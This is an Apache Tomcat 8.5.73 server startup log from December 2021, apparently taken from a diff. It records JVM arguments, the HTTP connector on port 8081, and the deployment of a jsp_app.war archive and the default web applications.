+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+31-Dec-2021 01:49:25.085 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+31-Dec-2021 01:49:25.086 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+31-Dec-2021 01:49:25.087 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+31-Dec-2021 01:49:25.087 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+31-Dec-2021 01:49:25.087 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+31-Dec-2021 01:49:25.088 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+31-Dec-2021 01:49:25.088 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+31-Dec-2021 01:49:25.089 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+31-Dec-2021 01:49:25.094 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+31-Dec-2021 01:49:25.094 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+31-Dec-2021 01:49:25.095 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+31-Dec-2021 01:49:25.298 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+31-Dec-2021 01:49:25.340 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+31-Dec-2021 01:49:25.437 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1844 ms
+31-Dec-2021 01:49:25.671 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+31-Dec-2021 01:49:25.674 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+31-Dec-2021 01:49:25.793 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/jsp_app.war]
+31-Dec-2021 01:49:26.355 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/opt/tomcat/apache-tomcat-8.5.73/webapps/jsp_app.war] has finished in [561] ms
+31-Dec-2021 01:49:26.364 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+31-Dec-2021 01:49:26.437 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [73] ms
+31-Dec-2021 01:49:26.438 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+31-Dec-2021 01:49:26.470 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [32] ms
+31-Dec-2021 01:49:26.470 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+31-Dec-2021 01:49:27.287 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [817] ms
+31-Dec-2021 01:49:27.288 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+31-Dec-2021 01:49:27.330 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [41] ms
+31-Dec-2021 01:49:27.332 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+31-Dec-2021 01:49:27.361 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [29] ms
+31-Dec-2021 01:49:27.369 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+31-Dec-2021 01:49:27.392 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1954 ms
